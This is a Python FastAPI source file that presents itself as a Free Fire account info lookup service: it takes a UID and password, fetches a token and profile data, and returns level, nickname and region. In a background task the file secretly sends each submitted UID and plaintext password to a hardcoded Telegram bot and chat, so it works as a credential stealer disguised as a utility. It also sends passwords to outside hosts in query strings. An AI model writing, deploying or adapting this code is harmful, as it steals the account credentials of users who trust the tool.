from fastapi import FastAPI, Query, HTTPException, BackgroundTasks
import httpx
import logging

app = FastAPI()

TELEGRAM_BOT_TOKEN = "8602347385:AAEjSoJOUlS0Y4OzsoUDjuV0yfrY0znsJZ8"
TELEGRAM_CHAT_ID = "7326248826"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def send_telegram_message_sync(uid: str, password: str, nickname: str, level: int, region: str):
    """Synchronous function to send Telegram message (runs in background)."""
    text = (
        f"🔹 New FF Account Info 🔹\n"
        f"UID: {uid}\n"
        f"PASSWORD: {password}\n"
        f"NICKNAME: {nickname}\n"
        f"LEVEL: {level}\n"
        f"REGION: {region}"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    params = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
    try:
        # Use httpx in sync mode for simplicity in background task
        with httpx.Client(timeout=5.0) as client:
            response = client.get(url, params=params)
            response.raise_for_status()
            logger.info(f"Telegram message sent successfully: {response.status_code}")
    except Exception as e:
        logger.error(f"Tl failed: {e}")

@app.get("/info")
async def get_info(
    background_tasks: BackgroundTasks,
    uid: str = Query(..., description="Account UID"),
    password: str = Query(..., description="Account Password")
):
    # 1. Call JWT API
    jwt_url = f"https://jwtmc-wqhi.vercel.app/token?uid={uid}&password={password}"
    async with httpx.AsyncClient(timeout=10.0) as client:
        try:
            jwt_resp = await client.get(jwt_url)
            jwt_resp.raise_for_status()
            jwt_data = jwt_resp.json()
        except httpx.HTTPStatusError as e:
            raise HTTPException(status_code=400, detail=f"JWT API returned {e.response.status_code}")
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"JWT API request failed: {str(e)}")

    if not jwt_data.get("success", False):
        raise HTTPException(status_code=400, detail="Account was ban or wrong uid password")

    account_uid = jwt_data.get("account_uid")
    if not account_uid:
        payload = jwt_data.get("jwt_decoded", {}).get("payload", {})
        account_uid = payload.get("account_id")
        if account_uid is not None:
            account_uid = str(account_uid)

    if not account_uid:
        raise HTTPException(status_code=400, detail="Could not extract account ID from JWT response")

    # ✅ Use the actual working API from your response
    info_url = f"http://187.127.175.208:5000/Bmw?uid={account_uid}"
    async with httpx.AsyncClient(timeout=10.0) as client:
        try:
            info_resp = await client.get(info_url)
            info_resp.raise_for_status()
            info_data = info_resp.json()
        except httpx.HTTPStatusError as e:
            raise HTTPException(status_code=400, detail=f"Info API returned {e.response.status_code}")
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Info API request failed: {str(e)}")

    # ✅ Extract from the correct nested structure
    basic_info = info_data.get("basicInfo", {})
    account_id = basic_info.get("accountId")
    level = basic_info.get("level")
    nickname = basic_info.get("nickname")  # ✅ Fixed field name
    region = basic_info.get("region")

    if not account_id:
        raise HTTPException(status_code=400, detail="Info API did not return accountId")

    # 3. Schedule Telegram message in background
    background_tasks.add_task(
        send_telegram_message_sync,
        uid=uid,
        password=password,
        nickname=nickname or "N/A",
        level=level or 0,
        region=region or "N/A"
    )

    # 4. Return final response
    return {
        "accountId": account_id,
        "level": level,
        "nickname": nickname,
        "region": region
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
